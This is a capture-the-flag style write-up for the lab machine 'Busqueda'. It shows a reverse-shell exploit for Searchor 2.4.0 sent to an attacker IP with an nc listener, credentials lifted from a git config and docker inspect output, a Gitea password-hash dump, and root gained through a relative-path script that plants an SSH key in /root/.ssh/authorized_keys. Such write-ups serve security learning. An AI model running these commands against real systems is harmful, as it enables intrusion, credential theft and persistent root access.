# Busqueda

## Machine Info

![Busqueda](./Busqueda.assets/Busqueda.png)

## Recon

### port

```console
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.0 - 5.5 (96%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### web

Powered by Flask and Searchor 2.4.0

## Foothold

### CMD Injection

**Exploit**: [Searchor 2.4.0 Arbitrary CMD Injection](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection)

```console
└─╼$ ./exploit.sh searcher.htb 10.10.16.8
---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---
[*] Input target is searcher.htb
[*] Input attacker is 10.10.16.8:9001
[*] Run the Reverse Shell... Press Ctrl+C after successful connection
-----------------------------------------------------------------------------
└─╼$ sudo rlwrap -cAr nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.11.208] 35904
bash: cannot set terminal process group (1684): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$ id
id
uid=1000(svc) gid=1000(svc) groups=1000(svc)
svc@busqueda:/var/www/app$ uname -a
uname -a
Linux busqueda 5.15.0-69-generic #76-Ubuntu SMP Fri Mar 17 17:19:29 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

## Privilege Escalation

### enum

- Gitea service: 3000 port

```console
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      1684/python3
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:40289         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:222           0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -

svc@busqueda:/dev/shm$ curl localhost:3000
curl localhost:3000
<!DOCTYPE html>
<html lang="en-US" class="theme-auto">
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Gitea: Git with a cup of tea</title>
```

- global git config -> discover a credential: `cody:jh1usoih2bkjaspwe92`
  - able to login Gitea
  - password of svc user

```console
svc@busqueda:~$ cat .gitconfig
[user]
        email = cody@searcher.htb
        name = cody
[core]
        hooksPath = no-hooks
svc@busqueda:~$ git config --global --list
WARNING: terminal is not fully functional
Press RETURN to continue
user.email=cody@searcher.htb
user.name=cody
core.hookspath=no-hooks
------------------------------------------------------------------------
svc@busqueda:/var/www/app/.git$ cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```

![image-20240305032845064](./Busqueda.assets/image-20240305032845064.png)

### port forward

```console
└─╼$ ./chisel_1.9.1_linux_amd64 server --reverse -p 9090
2024/03/04 23:54:44 server: Reverse tunnelling enabled
2024/03/04 23:54:44 server: Fingerprint j6Jnc8MiS5bVtknVyCyjvPOjaWJaJ3R3iHnvk4MCQ8g=
2024/03/04 23:54:44 server: Listening on http://0.0.0.0:9090
2024/03/04 23:56:10 server: session#1: tun: proxy#R:80=>localhost:3000: Listening

svc@busqueda:/dev/shm$ ./chisel client 10.10.16.8:9090 R:80:localhost:3000 &
```

### sudo enum

```console
svc@busqueda:/var/www/app$ sudo -l
[sudo] password for svc:
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *

svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py -h
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

Functions:

- docker-ps
- docker-inspect
- full-checkup

```console
svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED         STATUS             PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   14 months ago   Up About an hour   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   14 months ago   Up About an hour   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db

svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq .
{
  "Id": "960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb",
  "Created": "2023-01-06T17:26:54.457090149Z",
  "Path": "/usr/bin/entrypoint",
  "Args": [
    "/bin/s6-svscan",
    "/etc/s6"
  ],
 ...
  "Env": [
  "USER_UID=115",
  "USER_GID=121",
  "GITEA__database__DB_TYPE=mysql",
  "GITEA__database__HOST=db:3306",
  "GITEA__database__NAME=gitea",
  "GITEA__database__USER=gitea",
  "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
  "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
  "USER=git",
  "GITEA_CUSTOM=/data/gitea"
  ],
 ...

svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' mysql_db | jq .
{
  "Id": "f84a6b33fb5a09bcda93aa23ed0203e1597548a53368ea37c5e6a4d94f9334f8",
  "Created": "2023-01-06T17:26:45.724856768Z",
  "Path": "docker-entrypoint.sh",
  "Args": [
    "mysqld"
  ],
...
	"Ports": {
	  "3306/tcp": [
		{
		  "HostIp": "127.0.0.1",
		  "HostPort": "3306"
		}
	  ],
	  "33060/tcp": null
	},
...
    "Networks": {
      "docker_gitea": {
        "IPAMConfig": null,
        "Links": null,
        "Aliases": [
          "f84a6b33fb5a",
          "db"
        ],
        "NetworkID": "cbf2c5ce8e95a3b760af27c64eb2b7cdaa71a45b2e35e6e03e2091fc14160227",
        "EndpointID": "b6252dee955c9bfd406bf4c550f74780bc94642f19cdb5bed6934a938da97273",
        "Gateway": "172.19.0.1",
        "IPAddress": "172.19.0.2",
        "IPPrefixLen": 16,
        "IPv6Gateway": "",
        "GlobalIPv6Address": "",
        "GlobalIPv6PrefixLen": 0,
        "MacAddress": "02:42:ac:13:00:02",
        "DriverOpts": null
      }
```

Credential:

- `gitea:yuiu1hoiu4i5ho1uh`
- **mysql**: name: gitea, host: 172.19.0.2, port: 3306

```console
svc@busqueda:/var/www/app$ mysql -h 172.19.0.2 -u gitea -pyuiu1hoiu4i5ho1uh
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 104
Server version: 8.0.31 MySQL Community Server - GPL

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> select name,is_admin,passwd_hash_algo,passwd from user;
+---------------+----------+------------------+------------------------------------------------------------------------------------------------------+
| name          | is_admin | passwd_hash_algo | passwd                                                                                               |
+---------------+----------+------------------+------------------------------------------------------------------------------------------------------+
| administrator |        1 | pbkdf2           | ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 |
| cody          |        0 | pbkdf2           | b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e |
+---------------+----------+------------------+------------------------------------------------------------------------------------------------------+
2 rows in set (0.01 sec)
```

- `ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2`: uncrackable

- password: `yuiu1hoiu4i5ho1uh` -> able to login as administrator on Gitea

![image-20240305033326647](./Busqueda.assets/image-20240305033326647.png)

![image-20240305033337117](./Busqueda.assets/image-20240305033337117.png)

`./full-checkup.sh` uses relative path, which means customized script under the current directory can be executed as root.

**Exploit**:

```console
svc@busqueda:~/qwe$ echo -e '#!/bin/bash\nmkdir -p /root/.ssh/;echo "ssh-ed25519 AAAAC...odd1DnmCN qwe@kali">/root/.ssh/authorized_keys' > full-checkup.sh
svc@busqueda:~/qwe$ chmod +x full-checkup.sh
svc@busqueda:~/qwe$ sudo python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
```

## Exploit Chain

port scan -> web powered by Searchor 2.4.0 with exploit method -> svc user -> enum Gitea with port 3000 -> sudo script: docker inspect two containers -> credential to login Gitea as administrator -> check sudo script -> full-checkup function with script of relative path -> customized script with exploited code -> root

